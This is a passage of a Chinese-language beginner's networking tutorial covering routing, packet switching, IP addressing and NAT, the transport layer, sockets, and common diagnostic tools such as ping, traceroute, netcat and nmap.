-<h3 id="◇路由的大致原理"><a href="#◇路由的大致原理" class="headerlink" title="◇路由的大致原理"></a>◇路由的大致原理</h3><p>　　聊完“拓扑”，再来聊“路由”。<br>　　当主机 A 向主机 B 发送网络层的数据时，大致会经历如下步骤：<br>1.<br>A 主机的协议栈先判断“A B 两个地址”是否在同一个子网（“子网掩码”就是用来干这事儿滴）。<br>如果是同一个子网，直接发给对方；如果不是同一个子网，发给本子网的【默认网关】。<br>（此处所说的“网关”指“3层网关/网络层网关”）<br>2.<br>对于“默认网关”，有可能自己就是路由器；也可能自己不是路由器，但与其它路由器相连。<br>也就是说，“默认网关”要么自己对数据包进行路由，要么丢给能进行路由的另一台设备。<br>（万一找不到能路由的设备，这个数据就被丢弃，于是网络通讯出错）<br>3.<br>当数据到达某个路由器之后，有如下几种可能——<br>3.1<br>该路由器正好是 B 所在子网的网关（与 B 直连），那就把数据包丢给 B，路由过程就结束啦；<br>3.2<br>亦或者，路由器会把数据包丢给另一个路由器（另一个路由器再丢给另一个路由器） …… 如此循环往复，最终到达目的地 B。<br>3.3<br>还存在一种可能性：始终找不到“主机 B”（有可能该主机“断线 or 关机 or 根本不存在”）。为了避免数据包长时间在网络上闲逛，还需要引入某种【数据包存活机制】（洋文叫做“Time To Live”，简称 TTL）。<br>通常会采用某个整数（TTL 计数）表示数据包能活多久。当主机 A 发出这个数据包的时候，这个“TTL 计数”就已经设置好了。每当这个数据包被路由器转发一次，“TTL 记数”就减一。当 TTL 变为零，这个数据包就死了（被丢弃）。</p>
-<p>　　对于某些大型的复杂网络（比如互联网），每个路由器可能与其它 N 个路由器相连（N 可能很大）。对于上述的 3.2 情形，它如何判断：该转发给谁捏？<br>　　这时候，“路由算法”就体现出价值啦——<br>一般来说，路由器内部会维护一张【路由表】。每当收到一个网络层的数据包，先取出数据包中的【目标地址】，然后去查这张路由表，看谁距离目标最近，就把数据包转发给谁。<br>　　上面这段话看起来好像很简单，其实路由算法挺复杂滴。考虑到本文是“扫盲性质”，而且篇幅已经很长，不可能再去聊“路由算法”的细节。对此感兴趣的同学，可以去看《<a target="_blank" rel="noopener" href="https://docs.google.com/document/d/1XQwaAMzuGuvmq5fCiTDMrh_pTUpCHJJ5C17btTv8kdE/">计算机网络</a>》的第5章。</p>
-<h3 id="◇路由算法的演变史（以互联网为例）"><a href="#◇路由算法的演变史（以互联网为例）" class="headerlink" title="◇路由算法的演变史（以互联网为例）"></a>◇路由算法的演变史（以互联网为例）</h3><p>　　（技术菜鸟可以跳过这个小节）<br>　　由于互联网的 IP 协议已经成为“网络层协议”的事实标准，俺简单聊一下互联网的路由机制是如何进化滴。</p>
-<p><strong>第1阶段：静态全局路由表</strong><br>　　（前面说了）互联网的前身是“阿帕网/ARPANET”。在阿帕网诞生初期（上世纪70年代），全球的主机很少。因此，早期的路由表很简单，既是“全局”滴，又是“静态”滴。简而言之，每个路由器内部都维护一张“全局路由表”，这个“路由表”包含了全球所有其它路由器的关联信息。每当来了一个数据包，查一下这张全局路由表，自然就清楚要转发给谁，才能最快到达目的地。<br>　　早期的阿帕网，主机的变化比较少，也很少增加路由器。每当出现一个新的路由器，其它路由器的管理员就手工编辑各自的“全局路由表”。<br>　　为了加深大伙儿印象，特意找来两张70年代初的阿帕网拓扑图（注：图中的 IMP 是“Interface Message Processor”的缩写，也就是如今所说的“路由器”）。</p>
-<p><img src="https://lh5.googleusercontent.com/lgeICZCix4CsAg_VubQ00XSJr4eMmdOBSyINs3lbGOV25l1slX5K-6L_HHWWnj-sMQlNTVY0b01JzWL-g1zEn5y-VafJHEwLaJIwwqLEaP4I7JzxbMAk_3wvmnHO34NZYkb5rs98BtY" alt="不见图 请翻墙"><br>（1973年的阿帕网）</p>
-<p><img src="https://lh6.googleusercontent.com/miI68qcASC4oz00YtHW6Pv_O0nLK_BZ0PWAxs4J5x-yteT2ya0gkiheH_RCIkX6ZX_soaf2tPPWbXNOYqdhtNaNbLA5OJ3w5Ko47pwXK4hmCtKmHrBmvciP1JYnZCwvUvRqlAtGllG8" alt="不见图 请翻墙"><br>（1977年的阿帕网）</p>
-<p><strong>第2阶段：动态全局路由表</strong><br>　　后来，“阿帕网/互联网”的规模猛增，路由器数量也跟着猛增，隔三差五都有新的路由器冒出来。再用“静态路由表”这种机制，（编辑路由表的）管理员会被活活累死。于是改用“动态路由表”，并引入某种“路由发现机制”。但“路由表”依然是【全局】滴。</p>
-<p><strong>第3阶段：动态分级路由表</strong><br>　　再到后来，全球的路由器越来越多，成千上万，再搞“全局路由表”已经不太现实了——<br>一方面，“全局路由表”越来越大（查询的速度就越来越慢）<br>另一方面，由于互联网的流量越来越大，每来一个数据包都要查表，查询越来越频繁。<br>　　于是，路由器开始吃不消了。为了解决困境，想出一个新招数：引入“分级路由”（hierarchical routing）。所谓的“分级路由”就是：把整个互联网分为多个大区域，每个大区域内部再分小区域，小区域内部再分小小区域 …… 看到这里，熟悉“数据结构与算法”的同学就会意识到——这相当于构造了一个【树状】层次结构。<br>　　有了这个层次结构，每个路由器重点关注：自己所在的那个最小化区域里面的网络拓扑。如此一来，每个路由器的“路由表”都会大幅度减小。</p>
-<p><img src="https://lh5.googleusercontent.com/29WAIkuNnd2KC88vhFr7UG1ozUqnYQzt6k4VDmra_7Fiqu4lG4WKzEskw12GCuZgL8VKGd7aXI3KIqyGWNX8gwSRf_HzY8rDaG2VzFU9dp9q-wWYN1xyUixlefPu_MLtugsWWVBZfkE" alt="不见图 请翻墙"><br>（全局路由表 VS 分级路由表）</p>
-<h3 id="◇互联网的路由——从“CAS”的角度看其健壮性"><a href="#◇互联网的路由——从“CAS”的角度看其健壮性" class="headerlink" title="◇互联网的路由——从“CAS”的角度看其健壮性"></a>◇互联网的路由——从“CAS”的角度看其健壮性</h3><p>　　去年（2020）俺写了一篇博文《<a target="_blank" rel="noopener" href="https://program-think.blogspot.com/2020/04/Government-and-System-Robustness.html">“政治体制”与“系统健壮性”——基于“复杂性科学”的思考</a>》，其中介绍了“CAS”（复杂自适应系统）的概念。互联网的路由机制，就是一个典型的 CAS。<br>　　如果把互联网视作一个系统，每个公网上的路由器都是一个自适应的主体。假如某个地区的网络流量突然暴涨，骨干网路由器会自动分流；假如因为地震或战争，导致某个地区的骨干网路由器全部下线，周边地区的路由器也会自动避开这个区域 …..<br>　　所有这些工作，【不需要】依靠任何最高指挥中枢，去进行协调。<br>　　相反，如果互联网的路由系统中，设立了某种“中央委员会”进行实时调度，那互联网早就完蛋了，根本无法成长为今天这种规模。</p>
-<h3 id="◇网络层的两种交换技术——电路交换（circuit-switching）-VS-分组交换（packet-switching）"><a href="#◇网络层的两种交换技术——电路交换（circuit-switching）-VS-分组交换（packet-switching）" class="headerlink" title="◇网络层的两种交换技术——电路交换（circuit switching） VS 分组交换（packet switching）"></a>◇网络层的两种交换技术——电路交换（<a target="_blank" rel="noopener" href="https://en.wikipedia.org/wiki/Circuit_switching">circuit switching</a>） VS 分组交换（<a target="_blank" rel="noopener" href="https://en.wikipedia.org/wiki/Packet_switching">packet switching</a>）</h3><p>　　（技术菜鸟可以跳过这个小节）<br>　　前面聊“互联网诞生”，说到兰德公司的“Baran 方案”。该方案对当时的电信系统提出几大革命性的变化，其中之一就是“分组交换”技术（也称“数据包交换”or“封包交换”）。<br>　　一般来说，网络层的设计有两种截然不同的风格：【电路交换 VS 分组交换】。有时候也分别称之为“有连接的网络层 VS 无连接的网络层”。此处所说的“连接”指的是某种“虚电路”（洋文叫做“<a target="_blank" rel="noopener" href="https://en.wikipedia.org/wiki/Virtual_circuit">virtual circuit</a>”，简称 VC）。</p>
-<p>　　要理解“虚电路”，首先要从老式的电话系统说起。<br>　　最早期的电话，既没有拨号盘也没有按键，全靠一张嘴。当你拿起电话，先告诉接线员你要打给谁，接线员会用一根跳接线，插入电话交换设备的某个插孔，从而把你的电话机与对方的电话机相连。于是建立了一条两人之间的电话通路，也就是“电路”。你可以把“接线员”想象成某种“人肉路由器” :)</p>
-<p><img src="https://lh4.googleusercontent.com/Ry_GjLe2vTj2fr1dnvGbwn4O6JbFbaEYKPKQyP1UMNba0AKt85b_SmM_fZhlnhBePly-ByLsI3v_r978aUKRY4AAG54ws1yPZglIbOuXZOKvP3vqjvqNdX8MOk0L0CW2vhoGpnI-Jcc" alt="不见图 请翻墙"><br>（1900年法国巴黎的电话交换局，可以看到接线员在操作电话交换设备）</p>
-<p>　　后来发明了“自动电话交换机”，导致“接线员”全体下岗。虽然自动化了，但原理还是一样——当你在电话上拨了某人的号码，电话局的交换机会自动选择一条线路。只有当这条线路建立起来，对方的电话才会响。一旦双方开始通话，双方之间的语音都是通过这条线路传输。并且这条线路是独占的——只要通话不挂断，这条线路就不会再分配给其他人使用。</p>
-<p>　　前面提到“互联网诞生的历史”，当时军方推动的“Baran 方案”被 AT＆T 断然拒绝。因为这个方案完全颠覆了传统的电话系统——<br>颠覆之1：把“模拟信号”颠覆为“数字信号”（这点比较好理解，俺就不解释了）<br>颠覆之2：把“星形拓扑”颠覆为“网状拓扑”（关于这点，前面的小节已经讨论了）<br>颠覆之3：把“电路交换”颠覆为“分组交换”（这就是本小节的重点）</p>
-<p>　　为了帮大伙儿理解上述第3点，举个例子：<br>　　假设主机 A 要向主机 B 发送一大坨数据。因为数据太多，肯定要分成好几坨小一点的（分成多个数据包）。如何把这些数据包发送给对方捏？</p>
-<p><strong>“电路交换”的实现方式</strong><br>在发送数据之前，要先建立连接通道（通过路由算法，找出 A ＆ B 之间的某条通路）。这条通路就是所谓的“虚电路/VC”。一旦 VC 建立，每一个数据包都是从这条拓扑路径进行路由。</p>
-<p><strong>“分组交换”的实现方式</strong><br>在发送数据之前，【不需要】建立通道，让每个数据包独立进行路由。这种情况下，这几个数据包可能会走【不同的】拓扑路径。因此，数据包到达的顺序与发送的顺序【不一定】相同。接收方收到所有数据包之后，还要自己进行排序。<br>　　维基百科上有一个 GIF 动画（<a target="_blank" rel="noopener" href="https://upload.wikimedia.org/wikipedia/commons/thumb/f/f6/Packet_Switching.gif/480px-Packet_Switching.gif">这个链接</a>），比较直观地演示“分组交换/封包交换”的效果。由于这个动画稍微有点大（超过 1MB），俺就不贴到博文中了。</p>
-<p>　　当时的电话系统主要承载语音传输，“电路交换”显然性能更高。那为啥 Baran 的设计要采用“分组交换”捏？俺又要再次提到【效率 VS 健壮性】之间的矛盾与均衡。<br>　　对于“电路交换”，一旦建立连接，同一个连接的所有数据都走相同的路径（会经过完全相同的路由器）。也就是说，传输的过程中，如果某个路由器挂掉了（网络掉线 or 硬件当机 or 软件崩溃）。那么，该路由器正在处理的 N 个连接全都要报废。而“分组交换”则更加灵活——即使某个路由器挂掉了，后续的数据包会自动转向另外的路由器，损失很小。<br>　　“Baran 方案”之所以采用“分组交换”的设计，因为人家这个方案是提交给军方用来应对【全面核战争】滴，当然要考虑健壮性啦。</p>
-<p>　　话说这两种交换机制，各有很多支持者，并分裂为两大阵营，分别是：“电信阵营 VS 互联网阵营”。两大阵营的口水战持续了 N 年，都无法说服对方。到了后来设计 OSI 模型的时候，为了保持中立性与通用性，OSI 模型本身并没有强制要求网络层采用哪一种风格。<br>　　经过几十年之后，咱们已经可以看出来：“互联网阵营”占据主导地位。如今，连电信系统都是架构在互联网之上。</p>
-<h2 id="★网络层：具体实例"><a href="#★网络层：具体实例" class="headerlink" title="★网络层：具体实例"></a>★网络层：具体实例</h2><h3 id="◇网络层的【协议】"><a href="#◇网络层的【协议】" class="headerlink" title="◇网络层的【协议】"></a>◇网络层的【协议】</h3><p>　　网络层的协议有很多。由于“互联网”已经成为全球的事实标准，因此俺只列出属于“互联网协议族”的那些“网络层协议”：<br>IP 协议（含 <a target="_blank" rel="noopener" href="https://en.wikipedia.org/wiki/IPv4">IPv4</a> ＆ <a target="_blank" rel="noopener" href="https://en.wikipedia.org/wiki/IPv6">IPv6</a>）<br><a target="_blank" rel="noopener" href="https://en.wikipedia.org/wiki/Internet_Control_Message_Protocol">ICMP</a><br><a target="_blank" rel="noopener" href="https://en.wikipedia.org/wiki/Internet_Group_Management_Protocol">IGMP</a><br><a target="_blank" rel="noopener" href="https://en.wikipedia.org/wiki/IPsec">IPSec</a><br>……<br>（考虑到篇幅）俺不可能具体细聊这些协议，只是贴出每个的维基百科链接，感兴趣的同学自己点进去看。<br>　　对上述这些协议，最重要的当然是 IP 协议。如果你想要深入了解 IP 协议，可以参考如下这本书。关于 IP 协议的书，此书的影响力最大。这本书共3卷，通常只需看第1卷。<br>《<a target="_blank" rel="noopener" href="https://docs.google.com/document/d/1Fw2wSr-MgNm1d_M6F-rF1t_n3LwFWWBHrJt6vcYGta4/">TCP-IP 详解</a>》</p>
-<h3 id="◇网络层的【协议实现】"><a href="#◇网络层的【协议实现】" class="headerlink" title="◇网络层的【协议实现】"></a>◇网络层的【协议实现】</h3><p>　　对于电脑主机（含移动设备），网络层的协议实现通常包含在操作系统自带的网络模块中（也就是“操作系统协议栈”）。具体参见如下示意图。<br>　　另外，还有一些专门的【3层】网络设备，也提供网络层的功能（参见本章节的后续小节）。</p>
-<p><img src="https://lh4.googleusercontent.com/uYGaEvDYmziV-6EZ1AnRskoGpyKwxBcHgV5wgVtsDKmyP37OQgfX_zPYYeV3drFWBATFb95DYIwMPCgNApfg9Vtxrrpyvept6LNDQi0Vh3Fp6d31LFarI4ZjY1mSaQqP94HJaVQHBEQ" alt="不见图 请翻墙"><br>（OSI 模型中，不同层次的协议实现）</p>
-<h3 id="◇IP-地址的格式及含义"><a href="#◇IP-地址的格式及含义" class="headerlink" title="◇IP 地址的格式及含义"></a>◇IP 地址的格式及含义</h3><p>　　当年设计阿帕网的时候，采用了【4字节】（32比特）来表示“网络层地址”（也就是 IP 地址）。<br>　　“IP 地址”的含义很重要，俺有必要解释一下：<br>　　咱们平时所说的 IP 地址，采用【点分十进制】来表示。就是把地址的4个字节，先翻译为十进制，然后每个字节用一个小数点分隔开（参见如下示意图）：</p>
-<p><img src="https://lh5.googleusercontent.com/MCf0UTOAGLTbDJ5l46RlSHfidNm4PY7xqHrOBTP0P9OOneffxtC1B-VH_W2uBE7kCetsEMqTuLcS4niwj4MvqsXEA6QLeIvjTXQlGtBmgzL1d7VgrA5Na7YguV7OBKGzk9qvx_FrFHM" alt="不见图 请翻墙"><br>（4字节 IP 地址：“二进制”与“点分十进制”的对照示意图）</p>
-<p>　　“IP 地址”的32比特，分为两部分：第1部分用来标识【子网】，第2部分用来标识该子网中的【主机】。<br>　　这两部分各占用多少比特，是不确定的。在这种情况下，“操作系统协议栈”如何知道哪些比特标识“子网”，哪些比特标识“主机”捏？奥妙在于【子网掩码】。所以，大伙儿在给系统配置 IP 地址的时候，通常都需要再设置一个【子网掩码】，就这个用途。</p>
-<h3 id="◇IP-地址枯竭，及其解决方法"><a href="#◇IP-地址枯竭，及其解决方法" class="headerlink" title="◇IP 地址枯竭，及其解决方法"></a>◇IP 地址枯竭，及其解决方法</h3><p>　　前一个小节提到：IP地址包含【4字节】（32比特）。因此，最多只能表示【2的32次方】（42亿左右）的不同地址。考虑到还有很多地址保留给特殊用途，实际可用地址远远不到42亿。<br>　　到了如今，全球网民都已经几十亿了，IP 地址开始枯竭。咋办捏？为了解决这个问题，发展出若干技术手段。简单说一下最常见的几种手段：</p>
-<p><strong>IPv6</strong><br>　　名气最大（最多人知道）的技术手段，大概是 IPv6 了。这招想要一劳永逸地解决地址枯竭的问题，采用了16字节（128比特）来表示 IP 地址。<br>　　设计 IPv6 的人自豪地宣称：即使给地球上的每一粒沙子分配一个 IPv6 地址，依然绰绰有余（确实没有吹牛，“2的128次方”是天文数字）。<br>　　但 IPv6 的缺点在于，【无法】向下兼容原有的 IP 协议（原有的协议叫“IPv4”）。IPv6 的普及一直比较慢，这是主要原因。</p>
-<p><strong>代理服务器（proxy）</strong><br>　　一看到代理，很多人就想到翻墙。其实它也可以用来解决“地址枯竭”的问题。<br>　　比如说，某个公司有100人，100台电脑。如果每台电脑都分配公网 IP 地址，就要消耗100个公网地址（太浪费啦）。<br>　　可以只申请一个公网 IP，然后在内网搞一个代理服务器，公网 IP 分配给它（代理服务器有两个网卡，一个接内网，一个接公网）。然后在其它电脑上设置代理，指向这台代理服务器，就都可以上外网啦。<br>　　（注：在本文的末尾有一个 ★杂项 的章节，会专门聊一下“代理”这个话题）</p>
-<p><strong><a target="_blank" rel="noopener" href="https://zh.wikipedia.org/wiki/%E7%BD%91%E7%BB%9C%E5%9C%B0%E5%9D%80%E8%BD%AC%E6%8D%A2">网络地址转换</a>（NAT）</strong><br>　　前面 proxy 那招有个缺点：内网的每台电脑里面的每个上网软件，都要单独设置代理。实在太麻烦啦！<br>　　后来就发明了某种更牛逼的招数——网络地址转换（洋文是“Network Address Translation”，简称 NAT）。<br>　　用了这招，还是只要申请一个公网 IP，分配给内网的网关（网关有两个网卡，一个接内网，一个接公网）。然后在内网的网关配置 NAT 功能，自动就可以让内网的每台电脑访问外网。<br>　　在<a target="_blank" rel="noopener" href="https://program-think.blogspot.com/2012/12/system-vm-5.html">这篇博文</a>，俺介绍了虚拟机的几种“网卡模式”，其中有一种模式叫做【NAT 模式】，就是指这个玩意儿。<br>　　采用了 NAT 技术之后，可能会对某些应用软件（尤其是 P2P 类型的）造成兼容性问题，于是又发明了一些“NAT 穿透技术”（<a target="_blank" rel="noopener" href="https://en.wikipedia.org/wiki/NAT_traversal">NAT traversal</a>）。这类技术有好几种，如果有空的话，俺会单独写教程介绍。</p>
-<p><strong>其它解决方法</strong><br>　　关于“IPv4 地址空间耗尽”，解决方法肯定不止上面这几招。限于篇幅，就此打住。更多的讨论参见维基百科的“<a target="_blank" rel="noopener" href="https://en.wikipedia.org/wiki/IPv4_address_exhaustion">这个链接</a>”。</p>
-<h3 id="◇网络层相关的【网络设备】"><a href="#◇网络层相关的【网络设备】" class="headerlink" title="◇网络层相关的【网络设备】"></a>◇网络层相关的【网络设备】</h3><p><strong><a target="_blank" rel="noopener" href="https://zh.wikipedia.org/wiki/%E8%B7%AF%E7%94%B1%E5%99%A8">路由器</a>（router）</strong><br>　　（前面章节聊“路由原理”的时候，已经介绍过它；这里就不再浪费口水啦）</p>
-<p><strong>3层交换机（Layer 3 switching）</strong><br>　　“3层交换机”是在“2层交换机”的基础上，增加了对网络层的处理。因此，它可以做到类似路由器的效果——在几个子网之间转发数据。<br>　　与路由器的差别在于——“3层交换机”链接的几个子网是【同种】网络；而路由器可以连接【异种】网络。<br>　　从上面这句话看，“3层交换机”的能力显然不如“路由器”。既然已经有“路由器”，为啥还要发明“3层交换机”捏？这就要说到【单臂路由器】的弊端。<br>　　对于企业内网的“2层交换机”，通常都支持 VLAN 功能。通俗地说：可以在交换机中划分多个【虚拟子网】。其实这些子网的中所有的电脑，都还是接入这台交换机，只不过这些子网配置了不同的网络地址。对于同一个 VLAN 内部的通讯，“2层交换机”自己就可以搞定（只需要用到2层协议）；但对于【跨】VLAN 主机之间的通讯，“2层交换机”就没戏啦（它没有路由功能）。因此，就必须在它旁边外加一个路由器，形成如下拓扑结构。在这个拓扑中，路由器只与单个设备（2层交换机）相连，所以称之为“单臂”。<br>　　请注意：如下示意图只画了两台电脑，位于两个 VLAN。实际上可能有很多个 VLAN，每个里面有几十台电脑。于是，交换机与路由器之间的传输通道就会成为瓶颈——【跨】VLAN 的任意两台电脑通讯，数据包都要到路由器那里兜一圈。为了消除这种瓶颈，才发明了“3层交换机”——把路由功能直接集成到交换机内部。</p>
-<p><img src="https://lh4.googleusercontent.com/FTo8x8w2DwhPaz10fDJ2LdwywSaaPLlciSaH4wg0HY_sHKT0MHvDN6k2ZxAvyzojuzGpklzg7hBV1iolR40_1_LaxIqYeOa1lo0IWQrb0_cpJzoGQbdZCu7fPcgieH897MuEPwlA5Gw" alt="不见图 请翻墙"><br>（“单臂路由器”的拓扑结构）</p>
-<p><strong><a target="_blank" rel="noopener" href="https://zh.wikipedia.org/wiki/%E7%84%A1%E7%B7%9A%E6%8E%A5%E5%85%A5%E9%BB%9E">无线热点</a>（Wireless Access Point）</strong><br>　　“无线热点”通常用来提供无线接入，使得某个【无线】设备能接入到某个【有线】网络中。一般来说，热点都内置了路由功能，那么它就是“无线路由器”，对应到“3层”（网络层）。反之，如果没有路由功能，它就是“网桥”，属于“2层”（链路层）。</p>
-<h3 id="◇网络层相关的【软件工具】"><a href="#◇网络层相关的【软件工具】" class="headerlink" title="◇网络层相关的【软件工具】"></a>◇网络层相关的【软件工具】</h3><p><strong><a target="_blank" rel="noopener" href="https://en.wikipedia.org/wiki/Ping_(networking_utility)">ping</a></strong><br>　　这个命令，很多人应该都知道。早在 Win9x 就有这个命令了。它使用（网络层的）ICMP 协议来测试某个远程主机是否可达。<br>　　提醒一下：<br>　　如果 ping 命令显示某个 IP 地址不可达，有很多种情况。比如说：</p>
-<blockquote>
-<p>这个 IP 地址对应的主机已经关机<br>这个 IP 地址对应的主机已经断线<br>这个 IP 地址对应的主机拒绝响应 ICMP 协议<br>从你本机到这个 IP 地址之间，有某个防火墙拦截了 ICMP 协议<br>……</p>
-</blockquote>
-<p><strong><a target="_blank" rel="noopener" href="https://en.wikipedia.org/wiki/Traceroute">traceroute</a></strong><br>　　这是一个通用的工具，用来测试路由。很早以前的 Windows 就已经内置了它，命令是 <code>tracert</code>。在 POSIX（Linux＆UNIX）上通常叫 <code>traceroute</code><br>　　你可以用这个命令，测试你本机与互联网另一台主机之间的路由（也就是：从你本机到对方主机，要经过哪些路由器）</p>
-<h2 id="★传输层：概述"><a href="#★传输层：概述" class="headerlink" title="★传输层：概述"></a>★传输层：概述</h2><h3 id="◇传输层的必要性"><a href="#◇传输层的必要性" class="headerlink" title="◇传输层的必要性"></a>◇传输层的必要性</h3><p><strong>屏蔽“有连接 or 无连接”的差异</strong><br>　　（上一个章节提到）网络层本身已经屏蔽了【异种网络】的差异（比如“以太网、ATM、帧中继”之间的差异），而且网络层也屏蔽了路由的细节。但网络层本身还有一个差异，也就是网络层的两种交换技术：电路交换（有连接） VS 分组交换（无连接）。<br>　　前面章节也提到了：上述两种交换技术各有很多支持者，并分裂为两大阵营。当年设计 OSI 模型的时候，为了保持中立性与通用性，并没有强制规定“网络层”必须采用何种交换机制。<br>　　对于开发网络软件的程序员来说，当然不想操心“网络层用的是哪一种交换机制”。因此，需要对网络层的上述差异再加一个抽象层（也就是“传输层”）。</p>
-<p><strong>从“主机”到“进程”</strong><br>　　前面介绍的“网络层”，其设计是面向主机（电脑）。“网络层地址”也就是某个主机的地址。<br>　　而“传输层”是面向【进程】滴！因为传输层要提供给【网络软件】使用，而网络软件打交道的对象是【另一个网络软件】。因此，传输层必须在“网络层地址”的基础上，再引入某种新的标识，用来区分同一台主机上的不同【进程】。</p>
-<h3 id="◇传输层的特殊性"><a href="#◇传输层的特殊性" class="headerlink" title="◇传输层的特殊性"></a>◇传输层的特殊性</h3><p>　　在 OSI 7层模型中，传输层正好居中。这是一个很特殊的位置。<br>　　OSI 模型最下面3层，与【网络设备】比较密切。这里面所说的“网络设备”，既包括那些独立的主机（比如“路由器、交换机、等”），也包括电脑上的硬件（比如“网卡”）。<br>　　OSI 模型最上面3层，与【网络软件】比较密切（或者说，与“用户的业务逻辑”比较密切）。<br>　　而中间的传输层，正好是承上启下。对于开发应用软件的程序猿/程序媛，“传输层”是他们能感知的最低一层。</p>
-<h3 id="◇传输层的【端口】"><a href="#◇传输层的【端口】" class="headerlink" title="◇传输层的【端口】"></a>◇传输层的【端口】</h3><p>　　刚才谈“传输层的必要性”，提到说——“网络层地址”只能标识【主机】，而传输层必须要能标识【进程】。为了达到这个目的，于是就引入了“传输层端口”这个概念（为了打字省力，后续讨论简称为“端口”）。<br>　　在 OSI 模型中，“端口”的官方称呼是“传输服务访问点”（洋文缩写 TSAP）。但是作为程序员，俺已经习惯于“端口”这个称呼。后续介绍依然用“端口”一词。<br>　　当程序员使用传输层提供的 API 开发网络软件时，通常把“端口”与“网络地址”一起使用（构成“二元组”），就可以定位到某个主机上的某个进程。</p>
-<h2 id="★传输层：具体实例"><a href="#★传输层：具体实例" class="headerlink" title="★传输层：具体实例"></a>★传输层：具体实例</h2><h3 id="◇传输层的【协议】"><a href="#◇传输层的【协议】" class="headerlink" title="◇传输层的【协议】"></a>◇传输层的【协议】</h3><p>　　为了让程序员可以更爽地使用传输层来开发网络软件，传输层既要提供“有连接”的风格，也要提供“无连接”的风格。关于这两种风格的对比，前面已经聊过，这里不再浪费口水。<br>　　具体到“互联网协议族”，有两个主要的传输层实现，分别是 TCP ＆ UDP（前者是“有连接”，后者是“无连接”）。<br>　　除了 TCP ＆ UDP，“互联网协议族”还提供了其它一些传输层协议。因为比较冷门，俺就不介绍啦。</p>
-<h3 id="◇传输层的【协议实现】"><a href="#◇传输层的【协议实现】" class="headerlink" title="◇传输层的【协议实现】"></a>◇传输层的【协议实现】</h3><p>　　对于电脑主机（含移动设备），传输层的协议实现通常包含在操作系统自带的网络模块中（也就是“操作系统协议栈”）。具体参见如下示意图。<br>　　另外，还有一些专门的【4层】网络设备，也提供传输层的功能（参见后续的小节）。</p>
-<p><img src="https://lh4.googleusercontent.com/uYGaEvDYmziV-6EZ1AnRskoGpyKwxBcHgV5wgVtsDKmyP37OQgfX_zPYYeV3drFWBATFb95DYIwMPCgNApfg9Vtxrrpyvept6LNDQi0Vh3Fp6d31LFarI4ZjY1mSaQqP94HJaVQHBEQ" alt="不见图 请翻墙"><br>（OSI 模型中，不同层次的协议实现）</p>
-<h3 id="◇套接字（socket-API）"><a href="#◇套接字（socket-API）" class="headerlink" title="◇套接字（socket API）"></a>◇套接字（socket API）</h3><p>　　前面说了：传输层是面向程序员（让他们可以更方便地开发网络软件）。因此，就需要提供一些封装传输层的【库】（API）。程序员只需要调用这些【库】，就可以使用传输层的协议进行通讯啦。<br>　　影响力最大的传输层封装库，当然是 socket API。它来自加州大学伯克利分校。<br>　　在互联网诞生初期，伯克利分校开发了一个 UNIX 操作系统的的变种，叫做“伯克利 UNIX 发行版”（BSD Unix），也就是如今 BSD 操作系统的前身。伯克利发行版内置了一套用来进行网络编程的 API，当时叫做“伯克利套接字”（<a target="_blank" rel="noopener" href="https://en.wikipedia.org/wiki/Berkeley_sockets">Berkeley sockets</a>）。由于这套 API 用起来很方便，很多其它的 UNIX 变种也移植了这套 API，于是就逐渐成了业界的事实标准。到了上世纪90年代，Windows ＆ Linux 也都提供了这套 API。<br>　　由于大部分读者不是程序员，“套接字”这个话题就到此为止。如果你是个程序员，并且对网络编程感兴趣，可以参考<a target="_blank" rel="noopener" href="https://github.com/programthink/books">俺的电子书清单</a>，其中有一个分类目录是【IT 类 / 软件开发 / 网络相关】。</p>
-<h3 id="◇传输层相关的【网络设备】"><a href="#◇传输层相关的【网络设备】" class="headerlink" title="◇传输层相关的【网络设备】"></a>◇传输层相关的【网络设备】</h3><p><strong>4层交换机（Layer 4 switching）</strong><br>　　前面已经介绍了“3层交换机”，“4层交换机”是其进一步的改良，可以识别传输层的协议，获取 TCP or UDP 的端口号。<br>　　有了这个能力，网管就可以在这种交换机上配置一些管理策略。比如说：（根据传输层端口号）过滤掉某种流量，或者对某种流量设置转发的优先级。</p>
-<p><strong>状态防火墙（<a target="_blank" rel="noopener" href="https://en.wikipedia.org/wiki/Stateful_firewall">stateful firewall</a>）</strong><br>　　网络防火墙分好几种，大部分属于这种。它能完全处理 TCP 协议的状态，显然它属于“4层”（传输层）。</p>
-<h3 id="◇传输层相关的【软件工具】"><a href="#◇传输层相关的【软件工具】" class="headerlink" title="◇传输层相关的【软件工具】"></a>◇传输层相关的【软件工具】</h3><p><strong><a target="_blank" rel="noopener" href="https://en.wikipedia.org/wiki/Netcat">netcat</a> 家族</strong>——传输层的“瑞士军刀”<br>　　关于 netcat，俺已经写过一篇比较详细的教程：《<a target="_blank" rel="noopener" href="https://program-think.blogspot.com/2019/09/Netcat-Tricks.html">扫盲 netcat（网猫）的 N 种用法——从“网络诊断”到“系统入侵”</a>》。看完这篇教程，你肯定能体会它功能的强大——很多与 TCP/UDP 相关的事情，都可以用 netcat 搞定。<br>　　另外，netcat 还有很多衍生品（衍生的开源项目），构成一个丰富的 netcat 家族。在上述教程也有介绍。</p>
-<p><strong>netstat ＆ ss</strong><br>　　Windows 和 POSIX（Linux＆UNIX）都有一个 <code>netstat</code> 命令，可以查看当前系统的 TCP/UDP 状态（包括当前系统开启了哪些监听端口）。<br>　　另外，Linux 上还有一个 <code>ss</code> 命令，功能更强（但这个命令在 Windows 上默认没有）</p>
-<p><strong><a target="_blank" rel="noopener" href="https://en.wikipedia.org/wiki/Nmap">nmap</a></strong><br>　　这是最著名的开源的扫描器，可以扫描远程主机监听了哪些传输层端口（注：前面提到的“netcat 家族”也可以干这事儿）<br><code>nmap</code> 的功能很强，“端口扫描”只是其功能之一。</p>
-<h2 id="★业务层（OSI-上三层）：概述"><a href="#★业务层（OSI-上三层）：概述" class="headerlink" title="★业务层（OSI 上三层）：概述"></a>★业务层（OSI 上三层）：概述</h2><p>　　一不小心，这篇教程已经写了这么长。为了照顾那些有“阅读障碍”的读者，俺要稍微控制一下篇幅，就把 OSI 的【上三层】合在一起讨论。<br>　　前面的章节说过：【上三层】更接近于“网络软件”，对应的是应用软件的业务逻辑，因此俺统称为“业务层”。<br>　　注：有些书（比如《<a target="_blank" rel="noopener" href="https://docs.google.com/document/d/1XQwaAMzuGuvmq5fCiTDMrh_pTUpCHJJ5C17btTv8kdE/">计算机网络</a>》）会把 OSI 的上三层统称为“应用层”。由于 OSI 模型中本来就有一个“应用层”，俺认为这样容易搞混（尤其不利于技术菜鸟），所以另外起了一个“业务层”的名称。</p>
